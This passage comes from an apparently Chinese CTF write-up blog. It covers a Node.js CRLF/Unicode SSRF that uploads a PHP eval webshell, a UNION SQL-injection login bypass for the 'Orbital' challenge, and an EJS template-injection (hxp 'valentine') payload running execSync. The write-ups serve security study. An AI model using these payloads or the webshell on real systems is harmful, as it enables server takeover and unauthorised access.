ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ</span></span><br></pre></td></tr></table></figure>

<p>构造请求：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt; http.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="https://p0.ssl.qhimg.com/t01aac9eb365660564a.png"><img src="https://p0.ssl.qhimg.com/t01aac9eb365660564a.png" alt="img"></a></p>
<p>如上图所示，成功构造出了一个文件上传的POST请求，像这样的POST请求可以被我们用于 SSRF。下面我们分析一下整个攻击的过程。</p>
<p>原始请求数据如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000</span><br></pre></td></tr></table></figure>

<p>当我们插入CRLF数据后，HTTP请求数据变成了：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span></span><br><span class="line"><span class="language-php">Content-Length: <span class="number">437</span></span></span><br><span class="line"><span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">......</span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Upload</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"> HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></span><br></pre></td></tr></table></figure>

<p>上次请求包的Host字段和状态行中的 <code>HTTP/1.1</code> 就单独出来了，所以我们再构造一个请求把他闭合：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span></span><br><span class="line"><span class="language-php">Content-Length: <span class="number">437</span></span></span><br><span class="line"><span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">......</span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Upload</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">GET / HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">test: HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>Cyber Apocalypse 2023 wp</title>
    <url>/2023Cyber-Apocalypse/</url>
    <content><![CDATA[<p><code>前面几道题太基础，主要记录后面几道题目</code></p>
<span id="more"></span>

<h2 id="Orbital"><a href="#Orbital" class="headerlink" title="Orbital"></a>Orbital</h2><blockquote>
<p>In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?</p>
</blockquote>
<p>这道题就是sql注入登录，然后在下方可以进行下载文件，通过拦截数据，发现是一个文件包含，点击下载后会响应包中会有文件内容，于是根据本地文件查看得到flag所在文件名，抓包修改包内文件名，对其进行跨目录文件包含，得到flag，难度简单</p>
<hr>
<p>主要看到一个大佬思路，我是没想到的，所以记录一下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username, password</span>):</span><br><span class="line">    <span class="comment"># I don&#x27;t think it&#x27;s not possible to bypass login because I&#x27;m verifying the password later.</span></span><br><span class="line">    user = query(<span class="string">f&#x27;SELECT username, password FROM users WHERE username = &quot;<span class="subst">&#123;username&#125;</span>&quot;&#x27;</span>, one=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        passwordCheck = passwordVerify(user[<span class="string">&#x27;password&#x27;</span>], password)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> passwordCheck:</span><br><span class="line">            token = createJWT(user[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">            <span class="keyword">return</span> token</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>这里看到<code>username</code>被直接包含到<code>sql</code>语句中去，所以这是存在<code>sql</code>注入，</p>
<p>这段<code>sql</code>语句主要是查询数据库中用户名为输入数据的在数据表中的用户名和密码，</p>
<p>然后返回的用户名和密码保存到<code>user</code>变量中</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> &quot;&#123;username&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>当检测输入了用户名后，进行password校验</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> user:</span><br><span class="line">       passwordCheck = passwordVerify(user[<span class="string">&#x27;password&#x27;</span>], password) </span><br></pre></td></tr></table></figure>

<p>这里是将用户输入参数<code>password</code>，先进行md5加密，与数据库查询得到的<code>password</code>进行<code>md5</code>比较</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">passwordVerify</span>(<span class="params">hashPassword, password</span>):</span><br><span class="line"></span><br><span class="line">  md5Hash = hashlib.md5(password.encode())</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> md5Hash.hexdigest() == hashPassword: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>其实开始我是最先想到直接插入sql语句，这道题直接注入没有回显，需要报错注入</p>
<hr>
<p>但是看到一个大佬的wp，我又多了一个新思路</p>
<blockquote>
<p>既然它是将我输入的passwd与它通过存在sql注入漏洞的语句返回的查询值中的passwd进行md5</p>
<p>比较</p>
<p>如果，我修改后面的语句，使其返回一个admin用户名以及我伪造的md5密码，是不是就可以把admin用户密码认证伪造掉</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; union select &quot;</span>admin<span class="string">&quot;,&quot;</span>e10adc3949ba59abbe56e057f20f883e<span class="string">&quot;#</span></span><br></pre></td></tr></table></figure>

<p>这句话接到后面，前面语句返回为空，接着后面返回<code>admin</code>和密码<code>123456</code>（<code>e10adc3949ba59abbe56e057f20f883e</code>）</p>
<p>那么它就会把123456认为是admin的正确密码，然后和我们输入的密码进行对比，从而我们成功登录admin账户</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2023Cyber-Apocalypse/image-20230325214900826.png"><img src="/2023Cyber-Apocalypse/image-20230325214900826.png" alt="image-20230325214900826"></a></p>
<p>这是很好的思路，这比直接利用sql注入更加优雅，还是我对代码的敏感性不够</p>
<p><a data-fancybox="gallery" data-src="/2023Cyber-Apocalypse/image-20230325215054574.png"><img src="/2023Cyber-Apocalypse/image-20230325215054574.png" alt="image-20230325215054574"></a></p>
<p><a data-fancybox="gallery" data-src="/2023Cyber-Apocalypse/image-20230325220025877.png"><img src="/2023Cyber-Apocalypse/image-20230325220025877.png" alt="image-20230325220025877"></a></p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>hxp2022 wp</title>
    <url>/2022hxp/</url>
    <content><![CDATA[<p><code>在ctftime看到的，题目有深度的</code></p>
<span id="more"></span>

<blockquote>
<p>Disclaimer</p>
<p>This challenge offers an individual instance for you and therefore runs behind a proxy requesting login credentials. Locally use <code>hxp:hxp</code>.</p>
</blockquote>
<p>每个题的<code>docker-compose.yml</code>文件需要修改一下</p>
<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line">   <span class="attribute">build</span><span class="punctuation">:</span></span><br><span class="line"><span class="attribute">+    context</span><span class="punctuation">:</span> <span class="string">.</span></span><br><span class="line">     <span class="attribute">dockerfile</span><span class="punctuation">:</span> <span class="string">Dockerfile</span></span><br></pre></td></tr></table></figure>

<h2 id="valentine"><a href="#valentine" class="headerlink" title="valentine"></a>valentine</h2><p>WEB</p>
<p>Difficulty estimate: - easy</p>
<blockquote>
<p>Description:</p>
<p>Create an awesome template for your valentine and share it with the world!</p>
</blockquote>
<p>开始页面一看就知道是node.js的ssti</p>
<p><a data-fancybox="gallery" data-src="/2022hxp/image-20230406222548469.png"><img src="/2022hxp/image-20230406222548469.png" alt="image-20230406222548469"></a></p>
<p><a data-fancybox="gallery" data-src="/2022hxp/image-20230406222817323.png"><img src="/2022hxp/image-20230406222817323.png" alt="image-20230406222817323"></a></p>
<p>尝试直接用payload解决</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;%= <span class="built_in">global</span>.<span class="built_in">process</span>.mainModule.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;cat /flag.txt&#x27;</span>) %&gt;</span><br></pre></td></tr></table></figure>

<p>发现输入的数据实际上就是实现一个前端的效果，并不被模板化<a data-fancybox="gallery" data-src="/2022hxp/image-20230406223708029.png"><img src="/2022hxp/image-20230406223708029.png" alt="image-20230406223708029"></a></p>
<p>看看app.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line">viewsFolder = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(viewsFolder)) &#123;</span><br><span class="line">  fs.<span class="title function_">mkdirSync</span>(viewsFolder);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, viewsFolder);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/template&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> tmpl = req.<span class="property">body</span>.<span class="property">tmpl</span>;</span><br><span class="line">  <span class="keyword">let</span> i = -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>((i = tmpl.<span class="title function_">indexOf</span>(<span class="string">&quot;&lt;%&quot;</span>, i+<span class="number">1</span>)) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (tmpl.<span class="title function_">substring</span>(i, i+<span class="number">11</span>) !== <span class="string">&quot;&lt;%= name %&gt;&quot;</span>) &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">message</span>:<span class="string">&quot;Only &#x27;&lt;%= name %&gt;&#x27; is allowed.&quot;</span>&#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> uuid;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    uuid = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">  &#125; <span class="keyword">while</span> (fs.<span class="title function_">existsSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>, tmpl);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to write Valentine&#x27;s card&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> name = req.<span class="property">body</span>.<span class="property">name</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/<span class="subst">$&#123;uuid&#125;</span>?name=<span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/:template&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> query = req.<span class="property">query</span>;</span><br><span class="line">  <span class="keyword">let</span> template = req.<span class="property">params</span>.<span class="property">template</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="title function_">test</span>(template)) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;Not a valid card id&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(<span class="string">`views/<span class="subst">$&#123;template&#125;</span>.ejs`</span>)) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Valentine\&#x27;s card does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!query[<span class="string">&#x27;name&#x27;</span>]) &#123;</span><br><span class="line">    query[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">render</span>(template, query);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">sendFile</span>(<span class="string">&#x27;./index.html&#x27;</span>, &#123;<span class="attr">root</span>: __dirname&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">3000</span>);</span><br></pre></td></tr></table></figure>

<p>在这里</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/template&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> tmpl = req.<span class="property">body</span>.<span class="property">tmpl</span>;</span><br><span class="line">  <span class="keyword">let</span> i = -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>((i = tmpl.<span class="title function_">indexOf</span>(<span class="string">&quot;&lt;%&quot;</span>, i+<span class="number">1</span>)) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (tmpl.<span class="title function_">substring</span>(i, i+<span class="number">11</span>) !== <span class="string">&quot;&lt;%= name %&gt;&quot;</span>) &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">message</span>:<span class="string">&quot;Only &#x27;&lt;%= name %&gt;&#x27; is allowed.&quot;</span>&#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> uuid;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    uuid = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">  &#125; <span class="keyword">while</span> (fs.<span class="title function_">existsSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>, tmpl);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to write Valentine&#x27;s card&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> name = req.<span class="property">body</span>.<span class="property">name</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/<span class="subst">$&#123;uuid&#125;</span>?name=<span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>发现它会将输入的tmpl写入<code>views/$&#123;uuid&#125;.ejs</code>当作模板</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  fs.<span class="title function_">writeFileSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>, tmpl);</span><br><span class="line">&#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to write Valentine&#x27;s card&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是存在校验</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>((i = tmpl.<span class="title function_">indexOf</span>(<span class="string">&quot;&lt;%&quot;</span>, i+<span class="number">1</span>)) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (tmpl.<span class="title function_">substring</span>(i, i+<span class="number">11</span>) !== <span class="string">&quot;&lt;%= name %&gt;&quot;</span>) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">message</span>:<span class="string">&quot;Only &#x27;&lt;%= name %&gt;&#x27; is allowed.&quot;</span>&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段语句限制了如果输入的字段开头为<code>&lt;%</code>，那么从<code>&lt;%</code>开头后的字段必须是<code>&lt;%= name %&gt;</code></p>
<p>开始尝试各种方法绕过，但确实不行，因为仅能是<code>&lt;%= name %&gt;</code>,里面也不能加东西</p>
<blockquote>
<p>后面只有看wp才有思路，既然是从&lt;%进行匹配限制，如果可以修改模板语句让其不是&lt;%的开头，</p>
<p>所以绕过的思路就是能用其他的标签进行绕过</p>
</blockquote>
<p>但是在文档中查看时会发现，所有都是以<code>&lt;%</code>开头的标签</p>
<p><a data-fancybox="gallery" data-src="/2022hxp/image-20230411181542931.png"><img src="/2022hxp/image-20230411181542931.png" alt="image-20230411181542931"></a></p>
<h3 id="delimiter"><a href="#delimiter" class="headerlink" title="delimiter"></a>delimiter</h3><p><a href="https://github.com/mde/ejs#custom-delimiters">mde&#x2F;ejs: Embedded JavaScript templates delimiter</a></p>
<p>可以看到标签几乎都是以<code>&lt;%</code>开头和结尾的，</p>
<p>后面看官方wp时</p>
<blockquote>
<p>In his analysis, Eslam even scratches the possibility to overwrite options which are passed with data. He specifically mentions the delimiter in the context of abusing it for catastrophic regex.</p>
<p><strong>In what scenario does anybody even want to pass options with untrusted user data?</strong></p>
<p>Especially: Options which greatly affect the parsing of the template like ?<code>delimiter</code></p>
<p>And: Could this “feature” maybe be abused in any way?</p>
<p>Thus, the idea for this challenge was born.</p>
</blockquote>
<p>大致意思就是因为大都ssti过滤就只是对分隔符进行正则匹配过滤，但是如果有选项比如<code>delimiter</code>，可以利用其以不受信任的用户身份发生数据或者以其他形式滥用</p>
<p><code>delimiter</code>就是对标签的分隔符定义的选项，这样我们就可以通过其修改覆盖标签，从<code>&lt;%=</code>变成<code>&lt;?=</code>或者<code>&lt;==</code>等等</p>
<p><a data-fancybox="gallery" data-src="/2022hxp/image-20230411185506095.png"><img src="/2022hxp/image-20230411185506095.png" alt="image-20230411185506095"></a></p>
<p>但是如何传参使得标签覆盖并且同时传入我们的<code>payload</code>？</p>
